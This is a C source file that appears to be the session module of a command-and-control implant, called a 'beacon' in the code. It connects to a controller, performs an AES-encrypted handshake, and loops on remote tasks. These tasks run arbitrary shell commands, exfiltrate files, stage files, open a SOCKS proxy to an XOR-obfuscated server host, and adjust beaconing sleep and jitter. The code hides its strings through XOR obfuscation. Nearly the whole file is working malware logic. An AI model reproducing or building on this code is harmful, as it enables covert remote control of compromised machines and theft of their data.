#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include "comms/session.h"
#include "comms/socks.h"
#include "protocol.h"
#include "protocol/crypto.h"
#include "comms/http.h"
#include "exec/exec.h"
#include "exec/builtin.h"
#include "transfer/transfer.h"
#include "util/obf.h"
#include "obf_strings.h"
#include "beacon.h"
#include "config.h"

/* ---- send_all / recv_all ---- */

static int send_all(int sock, const uint8_t *buf, int len) {
    int sent = 0;
    while (sent < len) {
        int n = (int)send(sock, buf + sent, (size_t)(len - sent), MSG_NOSIGNAL);
        if (n <= 0) return -1;
        sent += n;
    }
    return 0;
}

static int recv_all(int sock, uint8_t *buf, int len) {
    int got = 0;
    while (got < len) {
        int n = (int)recv(sock, buf + got, (size_t)(len - got), 0);
        if (n <= 0) return -1;
        got += n;
    }
    return 0;
}

/* ---- mutex for thread-safe writes ---- */

static pthread_mutex_t g_write_mutex = PTHREAD_MUTEX_INITIALIZER;

/* ---- session_connect ---- */

int session_connect(const char *host, uint16_t port) {
    int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s < 0) return -1;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(port);
    if (inet_pton(AF_INET, host, &addr.sin_addr) != 1) {
        close(s);
        return -1;
    }

    if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        close(s);
        return -1;
    }
    return s;
}

/* ---- session_write: 4-byte LE length prefix + data ---- */

int session_write(int sock, const uint8_t *data, int len) {
    uint8_t hdr[4];
    hdr[0] = (uint8_t)(len);
    hdr[1] = (uint8_t)(len >> 8);
    hdr[2] = (uint8_t)(len >> 16);
    hdr[3] = (uint8_t)(len >> 24);
    if (send_all(sock, hdr, 4) != 0) return -1;
    if (send_all(sock, data, len) != 0) return -1;
    return 0;
}

/* ---- session_read: read 4-byte LE length, then payload ---- */

int session_read(int sock, uint8_t *out, int *out_len) {
    uint8_t hdr[4];
    if (recv_all(sock, hdr, 4) != 0) return -1;
    int len = (int)hdr[0] | ((int)hdr[1] << 8)
            | ((int)hdr[2] << 16) | ((int)hdr[3] << 24);
    if (len <= 0 || len > MAX_ENVELOPE) return -1;
    if (recv_all(sock, out, len) != 0) return -1;
    *out_len = len;
    return 0;
}

/* ---- safe_session_write: mutex-protected session_write ---- */

int safe_session_write(int sock, const uint8_t *data, int len) {
    pthread_mutex_lock(&g_write_mutex);
    int rc = session_write(sock, data, len);
    pthread_mutex_unlock(&g_write_mutex);
    return rc;
}

/* ---- send_result_session ---- */

int send_result_session(int sock, uint32_t label, uint8_t type, uint8_t code,
                        uint16_t flags, const char *output,
                        const uint8_t session_key[32]) {
    size_t out_len = strlen(output);
    if (out_len > 65536) out_len = 65536;
    size_t body_len = 4 + out_len;
    size_t pkt_len  = 16 + body_len;

    uint8_t *pkt = malloc(pkt_len);
    if (!pkt) return -1;

    task_header_t hdr = {0};
    hdr.type   = type;
    hdr.code   = code;
    hdr.flags  = flags;
    hdr.label  = label;
    hdr.length = (uint32_t)body_len;
    encode_header(&hdr, pkt);

    pkt[16] = (uint8_t)(out_len);
    pkt[17] = (uint8_t)(out_len >> 8);
    pkt[18] = (uint8_t)(out_len >> 16);
    pkt[19] = (uint8_t)(out_len >> 24);
    memcpy(pkt + 20, output, out_len);

    size_t enc_len = pkt_len + 64;
    uint8_t *enc = malloc(enc_len);
    if (!enc) { free(pkt); return -1; }

    if (aes_encrypt(session_key, pkt, pkt_len, enc, &enc_len) != 0) {
        free(pkt); free(enc); return -1;
    }
    free(pkt);

    int rc = safe_session_write(sock, enc, (int)enc_len);
    free(enc);
    return rc;
}

/* ---- send_result_raw_session ---- */

int send_result_raw_session(int sock, uint32_t label, uint8_t type,
                            uint16_t flags, uint32_t identifier,
                            const uint8_t *data, uint32_t data_len,
                            const uint8_t session_key[32]) {
    size_t pkt_len = 16 + data_len;
    uint8_t *pkt = malloc(pkt_len);
    if (!pkt) return -1;

    task_header_t hdr = {0};
    hdr.type       = type;
    hdr.code       = 0;
    hdr.flags      = flags;
    hdr.label      = label;
    hdr.identifier = identifier;
    hdr.length     = data_len;
    encode_header(&hdr, pkt);
    if (data_len > 0 && data) memcpy(pkt + 16, data, data_len);

    size_t enc_len = pkt_len + 64;
    uint8_t *enc = malloc(enc_len);
    if (!enc) { free(pkt); return -1; }

    if (aes_encrypt(session_key, pkt, pkt_len, enc, &enc_len) != 0) {
        free(pkt); free(enc); return -1;
    }
    free(pkt);

    int rc = safe_session_write(sock, enc, (int)enc_len);
    free(enc);
    return rc;
}

/* ---- do_handshake ---- */

static int do_handshake(int sock, uint32_t beacon_id,
                        uint8_t conn_type, const uint8_t session_key[32]) {
    /* 4 bytes beacon_id LE plaintext */
    uint8_t id_buf[4];
    id_buf[0] = (uint8_t)(beacon_id);
    id_buf[1] = (uint8_t)(beacon_id >> 8);
    id_buf[2] = (uint8_t)(beacon_id >> 16);
    id_buf[3] = (uint8_t)(beacon_id >> 24);
    if (send_all(sock, id_buf, 4) != 0) return -1;

    /* 1 byte conn_type */
    if (send_all(sock, &conn_type, 1) != 0) return -1;

    /* AES-encrypt beacon_id, send as envelope */
    uint8_t enc_buf[128];
    size_t enc_len = sizeof(enc_buf);
    if (aes_encrypt(session_key, id_buf, 4, enc_buf, &enc_len) != 0) return -1;
    if (session_write(sock, enc_buf, (int)enc_len) != 0) return -1;

    return 0;
}

/* ---- session_loop ---- */

void session_loop(int sock, uint8_t *session_key, uint32_t beacon_id,
                  uint32_t *sleep_sec, uint32_t *jitter_pct) {

    if (do_handshake(sock, beacon_id, CONN_SESSION, session_key) != 0)
        goto cleanup;

    while (1) {
        uint8_t *enc_data = malloc(MAX_ENVELOPE);
        if (!enc_data) goto cleanup;

        int enc_len = 0;
        if (session_read(sock, enc_data, &enc_len) != 0) {
            free(enc_data);
            goto cleanup;
        }

        size_t plain_len = (size_t)enc_len + 64;
        uint8_t *plain = malloc(plain_len);
        if (!plain) { free(enc_data); goto cleanup; }

        if (aes_decrypt(session_key, enc_data, (size_t)enc_len,
                        plain, &plain_len) != 0 || plain_len < 16) {
            free(plain); free(enc_data);
            goto cleanup;
        }
        free(enc_data);

        task_header_t hdr;
        decode_header(plain, &hdr);
        uint32_t task_data_len = hdr.length;
        const uint8_t *task_data = (16 + task_data_len <= (uint32_t)plain_len)
                                    ? plain + 16 : NULL;

        if (hdr.type == TASK_NOP) {
            /* reply NOP so server updates last_seen */
            task_header_t nop_hdr = {0};
            nop_hdr.type = TASK_NOP;
            uint8_t nop_buf[16];
            encode_header(&nop_hdr, nop_buf);
            size_t nop_enc_len = 128;
            uint8_t *nop_enc = malloc(nop_enc_len);
            if (nop_enc) {
                if (aes_encrypt(session_key, nop_buf, 16,
                                nop_enc, &nop_enc_len) == 0) {
                    safe_session_write(sock, nop_enc, (int)nop_enc_len);
                }
                free(nop_enc);
            }
            free(plain);
            continue;
        }
        else if (hdr.type == TASK_RUN) {
            char cmd[4096] = {0};
            if (task_data)
                decode_run_req(task_data, (int)task_data_len, cmd, sizeof(cmd));

            char shell_pfx[ENC_SHELL_PREFIX_LEN + 1];
            xor_dec(shell_pfx, ENC_SHELL_PREFIX, ENC_SHELL_PREFIX_LEN);

            char *builtin_out = malloc(MAX_CMD_OUTPUT);
            if (!builtin_out) { free(plain); continue; }
            builtin_out[0] = '\0';

            if (builtin_dispatch(cmd, builtin_out, MAX_CMD_OUTPUT)) {
                send_result_session(sock, hdr.label, TASK_RUN, CODE_RUN_SHELL,
                                    FLAG_NONE, builtin_out, session_key);
                free(builtin_out);
            } else if (strncmp(cmd, shell_pfx, ENC_SHELL_PREFIX_LEN) == 0) {
                free(builtin_out);
                size_t out_len = 0;
                char *output = exec_command_shell(cmd + 6, &out_len);
                send_result_session(sock, hdr.label, TASK_RUN, CODE_RUN_SHELL,
                                    FLAG_NONE, output ? output : "", session_key);
                free(output);
            } else {
                free(builtin_out);
                size_t out_len = 0;
                char *output = exec_command(cmd, &out_len);
                send_result_session(sock, hdr.label, TASK_RUN, CODE_RUN_SHELL,
                                    FLAG_NONE, output ? output : "", session_key);
                free(output);
            }
        }
        else if (hdr.type == TASK_SET && task_data && task_data_len >= 8) {
            const uint8_t *d = task_data;
            uint32_t interval = (uint32_t)d[0] | ((uint32_t)d[1] << 8)
                              | ((uint32_t)d[2] << 16) | ((uint32_t)d[3] << 24);
            uint32_t jitter   = (uint32_t)d[4] | ((uint32_t)d[5] << 8)
                              | ((uint32_t)d[6] << 16) | ((uint32_t)d[7] << 24);
            *sleep_sec   = interval;
            *jitter_pct  = jitter;

            char sleep_msg[ENC_LX_SLEEP_UPDATED_LEN + 1];
            xor_dec(sleep_msg, ENC_LX_SLEEP_UPDATED, ENC_LX_SLEEP_UPDATED_LEN);
            send_result_session(sock, hdr.label, TASK_SET, CODE_SET_SLEEP,
                                FLAG_NONE, sleep_msg, session_key);
        }
        else if (hdr.type == TASK_FILE_STAGE && task_data) {
            handle_file_stage(beacon_id, hdr.label, hdr.identifier,
                              hdr.flags, task_data, task_data_len,
                              session_key, sock);
        }
        else if (hdr.type == TASK_FILE_EXFIL && task_data) {
            handle_file_exfil(beacon_id, hdr.label,
                              (const char *)task_data,
                              session_key, sock);
        }
        else if (hdr.type == TASK_SOCKS_START && task_data && task_data_len >= 2) {
            uint16_t sport = (uint16_t)task_data[0] | ((uint16_t)task_data[1] << 8);
            char host[256];
            xor_dec(host, ENC_SERVER_HOST, ENC_SERVER_HOST_LEN);
            socks_start(host, sport, session_key, beacon_id);
        }
        else if (hdr.type == TASK_SOCKS_STOP) {
            socks_cleanup();
        }
        else if (hdr.type == TASK_EXIT) {
            free(plain);
            close(sock);
            http_cleanup();
            crypto_free();
            _exit(0);
        }
        else if (hdr.type == TASK_INTERACTIVE) {
            /* already in session mode — ignore */
        }
        else {
            char base[32];
            xor_dec(base, ENC_UNKNOWN_TASK, ENC_UNKNOWN_TASK_LEN);
            char err[64];
            snprintf(err, sizeof(err), "%s (%d)", base, (int)hdr.type);
            send_result_session(sock, hdr.label, hdr.type, 0,
                                FLAG_ERROR, err, session_key);
        }

        free(plain);
    }

cleanup:
    close(sock);
}
